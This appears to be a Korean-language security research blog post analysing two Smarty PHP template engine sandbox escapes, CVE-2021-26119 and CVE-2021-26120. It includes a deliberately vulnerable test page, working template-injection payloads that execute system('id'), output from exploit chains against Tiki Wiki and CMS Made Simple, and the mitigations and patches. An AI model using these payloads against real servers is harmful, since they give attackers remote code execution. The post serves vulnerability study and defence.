---
layout: post
title: "Smarty(PHP Template Engine) Sandbox Escape Vulnerailities: CVE-2021-26119 / CVE-2021-26120"
author: "donghyunlee00"
comments: true
tags: [cve, analysis, web]
---

라온화이트햇 핵심연구팀 [이동현](http://donghyunlee.me)

# Intro

올해(2021년) 여름부터 세 명의 동료(J-jaeyoung, [koharin](https://koharinn.tistory.com/), se0g1)와 세 개 이상의 원데이 취약점을 연결해 쿠버네티스 환경에서 동작하는 풀 체인 익스플로잇을 짜고 있습니다. 분석 대상 취약점 중 웹 취약점에 해당하는 CVE-2021-26119와 CVE-2021-26120을 소개하고자 합니다.

*본 문서는 우분투 20.04.2.0, PHP 7.4.3, Smarty 3.1.38 환경에서 작성했습니다.

# Summary

2021년 초, [Source Incite](https://srcincite.io/)의 보안 연구자 [Steven Seeley](https://twitter.com/steventseeley)가 PHP 템플릿 엔진인 [Smarty](https://www.smarty.net/)에서 두 개의 샌드박스 탈출 취약점을 발견했습니다. Smarty 3.1.39 이전 버전에 적용됩니다.

# About Smarty

아래 글은 Smarty 웹 사이트에서 'What is Smarty?'라고 하며 적어놓은 것 중 일부를 의역한 것입니다.

> Smarty는 PHP 템플릿 엔진으로, 애플리케이션 로직(PHP)에서 프레젠테이션 로직(HTML/CSS)을 분리 가능케 합니다.

직접 Smarty를 사용해 간단한 웹 페이지를 띄워보면 위 말을 쉽게 체감할 수 있습니다.

우선, PHP와 Smarty를 설치합니다.

```bash
### PHP 설치 ###
$ sudo apt update && sudo apt install -y php

### Smarty 설치 ###
$ mkdir smarty_test  # 도큐먼트 루트
$ cd smarty_test
$ wget https://github.com/smarty-php/smarty/archive/refs/tags/v3.1.38.tar.gz
$ tar -xvf v3.1.38.tar.gz && rm v3.1.38.tar.gz
$ ls
smarty-3.1.38
```

Smarty를 설치한다는 건 아래와 같이 Smarty 라이브러리 파일들을 다운받는 것입니다. `...` 으로 표시한 곳엔 무수히 많은 PHP 파일이 위치합니다.

```bash
$ sudo apt install -y tree
$ tree smarty-3.1.38
smarty-3.1.38
├── demo
│   └── ...
├── lexer
│   └── ...
├── libs
│   ├── ...
│   ├── Smarty.class.php
│   └── sysplugins
│       └── ...
└── ...

8 directories, 233 files
```

예시 웹 페이지를 띄우기 위해 도큐먼트 루트인 `smarty_test` 디렉토리에  `helloworld.tpl` 과 `helloworld.php` 파일을 만듭니다.

**helloworld.tpl**

```html
<html>
    <head>
        <title>{$title}</title>
    </head>
    <body>
        {$message}
    </body>
</html>
```

**helloworld.php**

```php
<?php
include_once('./smarty-3.1.38/libs/Smarty.class.php');
$smarty = new Smarty();
$title = 'Hello Smarty World';
$msg = 'Hello world, this is my first Smarty!';
$smarty->assign('title', $title);
$smarty->assign('message', $msg);
$smarty->display('helloworld.tpl');
// $smarty->display('file:helloworld.tpl');  // 위와 같은 결과 (`file:`은 생략 가능. 리소스를 명시하지 않으면 디폴트가 `file:`)
/*
$smarty->display('string:
<html>
    <head>
        <title>{$title}</title>
    </head>
    <body>
        {$message}
    </body>
</html>
');
*/  // 리소스를 `string:`으로 명시하고 `helloworld.tpl`의 내용을 문자열로 직접 입력해주어도 같은 결과
```

터미널에서 도큐먼트 루트 디렉토리에 `php -S localhost:8000` 을 입력해 PHP 내장 웹 서버를 실행시킨 후 접속한 모습이 다음과 같습니다.

![/assets/2021-07-01/smarty_1.png](/assets/2021-07-01/smarty_1.png)

.tpl 파일에 작성된 HTML 코드(프레젠테이션 로직)와 .php 파일에 작성된 PHP 코드(애플리케이션 로직)가 유기적으로 연동됩니다. `helloworld.tpl` 의 `{$title}`, `{$message}` 가 `helloworld.php` 의 `$title`과 `$msg` , 즉 `Hello Smarty World` 와 `Hello World, this is my first Smarty!` 로 치환되어 화면에 나타납니다.

Smarty 웹 사이트에 따르면 이러한 방식은 여러 장점이 있는데, 특히 개발자와 디자이너의 협업이 용이해지고 유지보수가 수월해진다고 합니다. 애플리케이션 로직과 프레젠테이션 로직이 분리되지 않으면 개발자와 디자이너가 PHP 코드와 HTML 코드가 섞인 하나의 파일에 동시에 수정을 하게 되는 일이 발생할 수 있기 때문입니다.

위에서와 같이 [localhost:8000/helloworld.php](http://localhost:8000/helloworld.php) 에 접속하면 `templates_c` 디렉토리가 만들어지며 그 안에 매우 긴 파일명의 .php 파일이 하나 생성되는 걸 확인할 수 있습니다.

![/assets/2021-07-01/smarty_2.png](/assets/2021-07-01/smarty_2.png)

이는  `helloworld.tpl`과 `helloworld.php` 로부터 컴파일 된 파일이 생성된 것이며, 웹 사이트에 접속 시 해당 파일이 결과로서 띄워집니다.

# Environment

## Template Injection

템플릿 인젝션이 발생할 수 있는 환경을 가정합니다. 많은 서비스에서 사용자가 템플릿을 변경 가능하고, Smarty가 샌드박스를 가지고 있다는 점을 감안하면 이는 꽤 범용적인 가정입니다.

다음과 같은 PHP 코드를 작성함으로써 이러한 가정을 충족할 수 있습니다.

**page.php**

```php
...
$smarty->display($_GET['poc']);
# $smarty->fetch($_GET['poc']);
```

그리고 아래와 같이 페이로드를 작성할 수 있습니다.

```
/page.php?poc=resource:/path/to/template
/page.php?poc=resource:{your template code here}
```

`resource:`에는 `file:` , `string:`  등이 들어갈 수 있습니다.

## Vulnerable Example

본 보고서 PoC에서는 두 가지 다른 샌드박스 설정을 가정합니다.

(참고: [https://www.smarty.net/docs/en/advanced.features.tpl](https://www.smarty.net/docs/en/advanced.features.tpl))

### Default Sandbox

기본 샌드박스 페이지는 보안 모드를 기본 세팅으로 활성화합니다.

**page.php**

```php
<?php
include_once('./smarty-3.1.38/libs/Smarty.class.php');
$smarty = new Smarty();
$smarty->enableSecurity();
$smarty->display($_GET['poc']);
```

### Hardened Sandbox

강화 샌드박스 페이지는 Smarty가 제공하는 가장 강력한 보안 모드 세팅으로 활성화합니다.

**page.php**

```php
<?php
include_once('./smarty-3.1.38/libs/Smarty.class.php');
$smarty = new Smarty();
$my_security_policy = new Smarty_Security($smarty);
$my_security_policy->php_functions = null;
$my_security_policy->php_handling = Smarty::PHP_REMOVE;
$my_security_policy->php_modifiers = null;
$my_security_policy->static_classes = null;
$my_security_policy->allow_super_globals = false;
$my_security_policy->allow_constants = false;
$my_security_policy->allow_php_tag = false;
$my_security_policy->streams = null;
$my_security_policy->php_modifiers = null;
$smarty->enableSecurity($my_security_policy);
$smarty->display($_GET['poc']);
```

# CVE-2021-26119

## Vulnerability Analysis

본 취약점의 근본 원인은 `$smarty.template_object` 변수에서 `Smarty` 인스턴스에 접근이 가능한 점입니다.

> **{$smarty.template_object}**
Returns the template object of the current template being processed.

(참고: [https://www.smarty.net/docs/en/language.variables.smarty.tpl](https://www.smarty.net/docs/en/language.variables.smarty.tpl))

아래와 같이 `$poc=$smarty.template_object` 라는 Smarty 코드를 포함하는 PHP 코드를 작성하고

```php
<?php
include_once('./smarty-3.1.38/libs/Smarty.class.php');
$smarty = new Smarty();
$smarty->display('string:{$poc=$smarty.template_object}blah-blah-blah');
```

해당 웹 페이지에 접속하면 다음과 같이 컴파일 된 파일이 생성됩니다.

```php
<?php
/* Smarty version 3.1.38, created on 2021-06-18 15:37:14
  from '83bc75606942fb8aac1709d06a401d6a0178b5c6' */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.38',
  'unifunc' => 'content_60ccbdaa887901_42396616',
  'has_nocache_code' => false,
  'file_dependency' => 
  array (
  ),
  'includes' => 
  array (
  ),
),false)) {
function content_60ccbdaa887901_42396616 (Smarty_Internal_Template $_smarty_tpl) {
$_smarty_tpl->_assignInScope('poc', $_smarty_tpl);?>blah-blah-blah<?php }
}
```

`$_smarty_tpl->_assignInScope('poc', $_smarty_tpl)` 부분이 눈에 들어옵니다. `$poc=$smarty.template_object` 코드가 `Smarty_Internal_Template` 의 인스턴스인 템플릿 오브젝트를 `$poc` 에 할당하는 역할을 수행하는 것을 알 수 있습니다.

Smarty 라이브러리 파일을 살펴보면 `Smarty_Internal_Compile_Private_Special_Variable` 클래스의 [`compile` 함수](https://github.com/smarty-php/smarty/blob/v3.1.38/libs/sysplugins/smarty_internal_compile_private_special_variable.php#L29)에서 이러한 컴파일 과정을 처리하는 것을 알 수 있습니다.

```php
case 'template_object':
    return '$_smarty_tpl';
```

컴파일 된 파일에 다음과 같이 `var_dump` 함수를 통해 `$_smarty_tpl` 의 정보를 출력하는 세 줄의 코드를 추가하고 다시 해당 웹 페이지에 접속하면

```php
<?php
...
function content_60ccbdaa887901_42396616 (Smarty_Internal_Template $_smarty_tpl) {
$_smarty_tpl->_assignInScope('poc', $_smarty_tpl);
echo '<pre>';
echo var_dump($_smarty_tpl);
echo '</pre>';
?>blah-blah-blah<?php }
}
```

아래와 같이 화면에 출력됩니다. 여러 흥미로운 오브젝트 속성들을 확인할 수 있습니다.

```php
object(Smarty_Internal_Template)#4 (24) {
  ...
  ["smarty"]=>
  &object(Smarty)#1 (76) { ... }
  ...
  ["parent"]=>
  object(Smarty)#1 (76) { ... } 
  ...
  ["compiled"]=>
  object(Smarty_Template_Compiled)#8 (12) { ... }
}
blah-blah-blah
```

공격자는 `smarty` 혹은 `parent` 속성을 통해 `Smarty` 인스턴스에 접근할 수 있습니다. (`object(Smarty)`)

## Exploitation - The Static Method Call Technique

Smarty 라이브러리 파일을 살펴보면 `Smarty_Internal_Runtime_WriteFile` 클래스에 [`writeFile` 메소드](https://github.com/smarty-php/smarty/blob/v3.1.38/libs/sysplugins/smarty_internal_runtime_writefile.php#L28)가 존재합니다.

```php
class Smarty_Internal_Runtime_WriteFile
{
    /**
     * Writes file in a safe way to disk
     *
     * @param string $_filepath complete filepath
     * @param string $_contents file content
     * @param Smarty $smarty    smarty instance
     *
     * @throws SmartyException
     * @return boolean true
     */
    public function writeFile($_filepath, $_contents, Smarty $smarty)
    {
        ...
    }
}
```

앞서 **Vulnerability Analysis**에서 설명한 방법을 통해 `smarty` 속성에 접근할 수 있고, 이를 `Smarty_Internal_Runtime_WriteFile::writeFile` 의 세번째 인자로 넘겨 디스크에 임의 파일을 쓸 수 있습니다. [James Kettle](https://skeletonscribe.net/)이 2015년에 [수행한 것](https://youtu.be/3cT0uE7Y87s)과 같은 기법입니다.

대상 파일 시스템의 임의 파일에 쓸 권한을 가진다는 건 '거의' 공격에 성공했다고 볼 수 있지만 완전히 확신할 수는 없습니다. 웹 루트에 쓰기 가능한 디렉토리가 존재하지 않을 수 있고, .htaccess 가 백도어 접근을 차단하는 등 다양한 환경이 존재합니다. 환경에 구애받지 않고 어떤 조건에서든 공격에 성공하기 위해선 뭔가가 더 필요합니다.

`string:` 리소스를 사용하면 `Smarty_Template_Compiled` 클래스의 [`process` 메소드](https://github.com/smarty-php/smarty/blob/v3.1.38/libs/sysplugins/smarty_template_compiled.php#L131)가 호출되고, 이는 컴파일된 템플릿 파일을 include 합니다.

```php
public function process(Smarty_Internal_Template $_smarty_tpl)
{
    $source = &$_smarty_tpl->source;
    $smarty = &$_smarty_tpl->smarty;
    if ($source->handler->recompiled) {
        $source->handler->process($_smarty_tpl);
    } elseif (!$source->handler->uncompiled) {
        if (!$this->exists || $smarty->force_compile
            || ($_smarty_tpl->compile_check && $source->getTimeStamp() > $this->getTimeStamp())
        ) {
            $this->compileTemplateSource($_smarty_tpl);
            $compileCheck = $_smarty_tpl->compile_check;
            $_smarty_tpl->compile_check = Smarty::COMPILECHECK_OFF;
            $this->loadCompiledTemplate($_smarty_tpl);
            $_smarty_tpl->compile_check = $compileCheck;
        } else {
            $_smarty_tpl->mustCompile = true;
            @include $this->filepath;  // filepath가 가리키는 파일(컴파일된 템플릿 파일)을 include
...
```

상기 **Vulnerability Analysis**에 서술된 방식으로 `Smarty_Template_Compiled` 클래스의 `filepath` 속성에 동적으로 접근할 수 있고(`$smarty.template_object->compiled->filepath`), `Smarty_Internal_Runtime_WriteFile::writeFile` 메소드의 첫번째 인자로 넘겨 해당 경로의 파일에 임의로 쓸 수 있습니다. 즉, 컴파일된 템플릿 파일에 원하는 내용을 써 웹 페이지에서 변경된 내용으로 인식하게 할 수 있습니다.

플랫폼과 상관없이 컴파일된 템플릿 파일은 항상 쓰기 가능하기 때문에 어떤 환경에서든 가능한 방법입니다.

### Proof of Concept

위에서 설명한 **Default Sandbox**로 웹 페이지를 띄운 후 아래 주소로 두 번 접속합니다.

```
http://localhost:8000/page.php?poc=string:{$s=$smarty.template_object->smarty}{$fp=$smarty.template_object->compiled->filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,"<?php+system('id');",$s)}
```

![/assets/2021-07-01/smarty_3.png](/assets/2021-07-01/smarty_3.png)

요청을 두 번 보내는 이유는 첫 번째 요청 시 컴파일된 템플릿 파일이 읽어진 후 덮어써지고, 두 번째 요청 시에 덮어써진 내용이 표시되기 때문입니다.

### Mitigation

`Smarty_Internal_Runtime_WriteFile` 클래스에 접근하는 것을 방지하기 위해 보안 정책에서 `static_classes` 속성을 `null` 로 설정할 수 있습니다. 

```php
...
$my_security_policy = new Smarty_Security($smarty);
$my_security_policy->static_classes = null;
$smarty->enableSecurity($my_security_policy);
...
```

다만 이러한 방식은 본 취약점 방지 뿐만 아니라 정적 메소드를 호출하는 다른 기능에도 영향을 주기 때문에 바람직한 방식은 아닙니다. 가령 [Yii](https://www.yiiframework.com/extension/yiisoft/yii2-smarty/doc/guide/2.0/en/template-syntax) 프레임워크 사용 시 호출하는 `Html::mailto` , `JqueryAsset::register`  등이 정삭적으로 작동하지 않게 됩니다.

## Exploitation - The Sandbox Disabling Technique

기본 보안 정책이 아닌 강화된 보안 정책을 가진 대상을 상정해봅시다. 그래도 여전히 본 취약점을 사용한 공격은 유효합니다. 보안 정책과 상관없이 `Smarty` 인스턴스에 접근할 수 있고, 이를 통해 샌드박스 자체를 비활성화한 후 삽입한 PHP 코드를 직접적으로 렌더링할 수 있습니다.

[`$smarty.template_object->smarty->disableSecurity()`](https://github.com/smarty-php/smarty/blob/v3.1.38/libs/Smarty.class.php#L746) 를 사용합니다.

```php
/**
 * Disable security
 *
 * @return Smarty current Smarty instance for chaining
 */
public function disableSecurity()
{
    $this->security_policy = null;
    return $this;
}
```

### Proof of Concept

위에서 설명한 **Hardened Sandbox**로 웹 페이지를 띄운 후 아래 주소로 접속합니다.

```
http://localhost:8000/page.php?poc=string:{$smarty.template_object->smarty->disableSecurity()->display('string:{system(\'id\')}')}
```

![/assets/2021-07-01/smarty_4.png](/assets/2021-07-01/smarty_4.png)

### Mitigation

`$smarty.template_object` 에 접근하는 것을 방지하기 위해 보안 정책의 `disabled_special_smarty_vars` 속성에 `template_object` 문자열을 포함하도록 설정할 수 있습니다. (본 문서를 작성할 당시 이 기능은 공식 문서 어디에도 나와있지 않았습니다.)

```php
...
$my_security_policy = new Smarty_Security($smarty);
$my_security_policy->disabled_special_smarty_vars = array("template_object");
$smarty->enableSecurity($my_security_policy);
...
```

# CVE-2021-26120

## Vulnerability Analysis & Exploitation

본 취약점의 근본 원인은 템플릿 구문 컴파일 시 [`Smarty_Internal_Runtime_TplFunction` 클래스](https://github.com/smarty-php/smarty/blob/v3.1.38/libs/sysplugins/smarty_internal_runtime_tplfunction.php)에서 템플릿 함수 이름을 올바르게 필터링 하지 않는 점입니다.

아래 코드를 예제로 봅시다.

```php
<?php
include_once('./smarty-3.1.38/libs/Smarty.class.php');
$smarty = new Smarty();
$smarty->display('string:{function name="test"}{/function}');
```

위 PHP 코드가 띄운 웹 페이지에 접속하면 컴파일러가 아래와 같은 컴파일된 템플릿 파일을 생성하는 것을 확인할 수 있습니다.

```php
<?php
/* Smarty version 3.1.38, created on 2021-06-20 21:47:25
  from 'aed233e3cf9592ad67c2ee7e6022bb543f60b642' */
...
/* smarty_template_function_test_63225500060d019dd8ab132_31447301 */
if (!function_exists('smarty_template_function_test_63225500060d019dd8ab132_31447301')) {
function smarty_template_function_test_63225500060d019dd8ab132_31447301(Smarty_Internal_Template $_smarty_tpl,$params) {  // 작은 따옴표로 감싸여지지 않은 채 `test` 문자열 삽입됨
foreach ($params as $key => $value) {
$_smarty_tpl->tpl_vars[$key] = new Smarty_Variable($value, $_smarty_tpl->isRenderingCache);
}
}}
/*/ smarty_template_function_test_63225500060d019dd8ab132_31447301 */
}
```

`name` 으로 준 `test` 라는 문자열이 생성된 코드에 수 차례 삽입되어 있습니다. 주목할 점은 작은 따옴표로 감싸져 있지 않은 부분입니다.

만일 `name` 으로 `rce(){};system("id");function`   문자열을 준다면 아래와 같은 코드가 생성될 것입니다.

```php
...
function smarty_template_function_rce(){};system("id");function _63225500060d019dd8ab132_31447301(Smarty_Internal_Template $_smarty_tpl,$params) {
...
}
```

즉, 공격 성공입니다. 원하는 코드를 삽입해 동작시킬 수 있습니다.

### Proof of Concept

위에서 설명한 **Hardened Sandbox**로 웹 페이지를 띄운 후 아래 주소로 접속합니다.

```
http://localhost:8000/page.php?poc=string:{function+name='rce(){};system("id");function+'}{/function}
```

![/assets/2021-07-01/smarty_5.png](/assets/2021-07-01/smarty_5.png)

# Real World Exploitation

Steven Seeley는 두 개의 CMS 플랫폼에 대해 본 문서에서 기술한 취약점을 적용해 익스플로잇에 성공했습니다.

## Tiki Wiki CMS Groupware

본 문서에서 기술한 취약점인 CVE-2021-26119와 CVE-2020-15906을 연계해 RCE에 성공했습니다.

익스플로잇 코드: [https://srcincite.io/pocs/cve-2021-26119.py.txt](https://srcincite.io/pocs/cve-2021-26119.py.txt)

```bash
researcher@incite:~/tiki$ ./poc.py
(+) usage: ./poc.py <host> <path> <cmd>
(+) eg: ./poc.py 192.168.75.141 / id
(+) eg: ./poc.py 192.168.75.141 /tiki-20.3/ id

researcher@incite:~/tiki$ ./poc.py 192.168.75.141 /tiki-20.3/ "id;uname -a;pwd;head /etc/passwd"
(+) blanking password...
(+) admin password blanked!
(+) getting a session...
(+) auth bypass successful!
(+) triggering rce...

uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux target 5.8.0-40-generic #45-Ubuntu SMP Fri Jan 15 11:05:36 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
/var/www/html/tiki-20.3
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

## CMS Made Simple

본 문서에서 기술한 취약점인 CVE-2021-26120와 CVE-2019-9053을 연계해 RCE에 성공했습니다.

익스플로잇 코드: [https://srcincite.io/pocs/cve-2021-26120.py.txt](https://srcincite.io/pocs/cve-2021-26120.py.txt)

```bash
researcher@incite:~/cmsms$ ./poc.py
(+) usage: ./poc.py <host> <path> <cmd>
(+) eg: ./poc.py 192.168.75.141 / id
(+) eg: ./poc.py 192.168.75.141 /cmsms/ "uname -a"

researcher@incite:~/cmsms$ ./poc.py 192.168.75.141 /cmsms/ "id;uname -a;pwd;head /etc/passwd"
(+) targeting http://192.168.75.141/cmsms/
(+) sql injection working!
(+) leaking the username...
(+) username: admin
(+) resetting the admin's password stage 1
(+) leaking the pwreset token...
(+) pwreset: 35f56698a2c3371eff7f38f34f001503
(+) done, resetting the admin's password stage 2
(+) logging in...
(+) leaking simplex template...
(+) injecting payload and executing cmd...

uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux target 5.8.0-40-generic #45-Ubuntu SMP Fri Jan 15 11:05:36 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
/var/www/html/cmsms
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

# Patch

## CVE-2021-26119

보안 모드에서 `$smarty.template_object` 에 접근하지 못하도록 검증 로직을 추가하였습니다. 확인 결과, 패치된 버전인 3.1.39에서는 기본적으로 접근이 제한되어 있었습니다.

패치 커밋: [https://github.com/smarty-php/smarty/commit/c9272058d972045dda9c99c64a82acb21c93c6ad?branch=c9272058d972045dda9c99c64a82acb21c93c6ad](https://github.com/smarty-php/smarty/commit/c9272058d972045dda9c99c64a82acb21c93c6ad?branch=c9272058d972045dda9c99c64a82acb21c93c6ad)

![/assets/2021-07-01/smarty_6.png](/assets/2021-07-01/smarty_6.png)

## CVE-2021-26120

함수 이름을 필터링하는 규칙을 추가했습니다.

패치 커밋: [https://github.com/smarty-php/smarty/commit/4f634c0097ab4a8b2adc2a97caacd1676e88f9c8?branch=4f634c0097ab4a8b2adc2a97caacd1676e88f9c8](https://github.com/smarty-php/smarty/commit/4f634c0097ab4a8b2adc2a97caacd1676e88f9c8?branch=4f634c0097ab4a8b2adc2a97caacd1676e88f9c8)

![/assets/2021-07-01/smarty_7.png](/assets/2021-07-01/smarty_7.png)

# References

[https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html](https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html)

[https://portswigger.net/daily-swig/vulnerabilities-in-smarty-php-template-engine-renders-cms-platforms-open-to-abuse](https://portswigger.net/daily-swig/vulnerabilities-in-smarty-php-template-engine-renders-cms-platforms-open-to-abuse)

[https://youtu.be/CDwHQmxkNQU](https://youtu.be/CDwHQmxkNQU)

[http://www.phpschool.com/classroom/SmartyDocument.pdf](http://www.phpschool.com/classroom/SmartyDocument.pdf)